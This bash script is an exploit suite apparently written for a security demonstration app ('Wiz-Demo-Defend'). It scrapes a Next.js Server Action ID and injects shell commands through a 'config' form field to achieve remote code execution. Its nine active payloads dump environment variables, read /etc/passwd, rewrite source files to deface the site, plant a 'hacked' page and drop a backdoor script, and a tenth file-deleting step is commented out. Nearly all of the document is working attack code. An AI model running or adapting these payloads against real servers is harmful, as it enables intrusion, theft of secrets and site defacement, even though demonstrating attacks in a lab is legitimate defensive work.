#!/bin/bash

# React2Shell / Wiz-Demo-Defend Exploit Script
# Demonstrates 10 distinct attack vectors via RCE in the 'config' parameter.
# Usage: ./exploit.sh [URL]

TARGET="${1:-http://localhost:3000}"
GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${RED}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║            WIZ-DEMO-DEFEND EXPLOIT SUITE                   ║${NC}"
echo -e "${RED}╚════════════════════════════════════════════════════════════╝${NC}"
echo -e "${BLUE}[*] Target: ${TARGET}${NC}"
echo ""

# Step 0: Scrape Action ID
echo -e "${YELLOW}[*] Scraping Next.js Server Action ID...${NC}"
ACTION_ID=$(curl -s "$TARGET" | grep -o '\$ACTION_ID_[0-9a-fA-F]\+' | head -n 1)

if [ -z "$ACTION_ID" ]; then
    echo -e "${RED}[!] Failed to find Action ID. The server might not be running or page structure changed.${NC}"
    # Try a fallback or exit? 
    # For now, let's warn but proceed (maybe it works without if misconfigured, but unlikely)
    # exit 1 
else
    echo -e "${GREEN}[+] Found Action ID: $ACTION_ID${NC}"
fi

# Store successful attacks
SUCCESSFUL_ATTACKS=()

# Helper function to execute exploit
function run_exploit() {
    local name="$1"
    local command="$2"
    local step="$3"
    
    echo -e "${YELLOW}[${step}/10] Executing: ${name}...${NC}"
    
    # Payload Construction:
    # configRaw needs to inject into: echo '... "config": ${configRaw}}' ...
    # We send config='$(command)'
    local payload="'\$($command)'"
    
    # We include the Action ID as a form field.
    # Next.js Server Actions expects the key to be the Action ID string.
    
    if [ -n "$ACTION_ID" ]; then
        response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET" \
          -F "username=attacker" \
          -F "bio=Exploit Step $step" \
          -F "$ACTION_ID=" \
          -F "config=$payload")
    else
        # Fallback if no ID found (might fail)
        response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET" \
          -F "username=attacker" \
          -F "bio=Exploit Step $step" \
          -F "config=$payload")
    fi
      
    if [ "$response" -eq 200 ] || [ "$response" -eq 500 ] || [ "$response" -eq 303 ]; then
        # 303 See Other is common for successful Server Action redirects
        echo -e "${GREEN}    [+] Request sent (HTTP $response).${NC}"
        SUCCESSFUL_ATTACKS+=("$name")
    else
        echo -e "${RED}    [-] Request failed (HTTP $response).${NC}"
    fi
    
    sleep 0.2
}

# 1. Basic Recon: ID (Write to local directory for visibility if running locally, or /tmp)
run_exploit "Basic Recon (id)" "id > /tmp/pwned_1_id 2>&1" "1"

# 2. System Info
run_exploit "System Info (uname)" "uname -a > /tmp/pwned_2_sysinfo 2>&1" "2"

# 3. Environment Variables
run_exploit "Environment Dump" "env > /tmp/pwned_3_env 2>&1" "3"

# 4. File Listing (Current Directory)
run_exploit "List Application Directory" "ls -la \$(pwd) > /tmp/pwned_4_ls 2>&1" "4"

# 5. Read Critical File
run_exploit "Read /etc/passwd" "cat /etc/passwd > /tmp/pwned_5_passwd 2>&1" "5"

# 6. Defacement: Change Title
# Since we are likely in dev mode, modifying the source file will trigger hot reload!
run_exploit "Defacement: Change Title" "perl -pi -e 's/WIZ-DEMO-DEFEND/HACKED-BY-REDTEAM/g' src/app/page.tsx" "6"

# 7. Defacement: Change Status
run_exploit "Defacement: Change Status" "perl -pi -e 's/ONLINE/COMPROMISED/g' src/app/page.tsx" "7"

# 8. Defacement: Hacked Banner
# Create public directory if missing and write file
run_exploit "Defacement: Create Banner" "mkdir -p public && echo '<h1>YOU HAVE BEEN HACKED</h1>' > public/hacked.html" "8"

# 9. Persistence: Backdoor
run_exploit "Persistence: Drop Backdoor" "echo '#!/bin/bash\nwhile true; do echo pwned; sleep 60; done' > /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh" "9"

# 10. Destruction/Cleanup (Simulation)
# DISABLED FOR VERIFICATION
# run_exploit "Cleanup: Remove Proofs" "rm -f /tmp/pwned_*" "10"

echo -e "${RED}══════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}                  EXPLOIT SUMMARY                             ${NC}"
echo -e "${RED}══════════════════════════════════════════════════════════════${NC}"
echo "Executed 10 attacks."
echo ""
echo -e "${BLUE}[*] Verification Instructions:${NC}"
echo -e "1. Check if /tmp/pwned_1_id exists (simulated check below):"
if [ -f /tmp/pwned_1_id ]; then
    echo -e "${GREEN}   [+] RCE Confirmed! Found /tmp/pwned_1_id${NC}"
    head -n 1 /tmp/pwned_1_id
else
    echo -e "${YELLOW}   [?] /tmp/pwned_1_id not found locally.${NC}"
fi

echo -e "2. Check http://localhost:3000/hacked.html"
echo -e "3. Refresh the page to see if title changed."
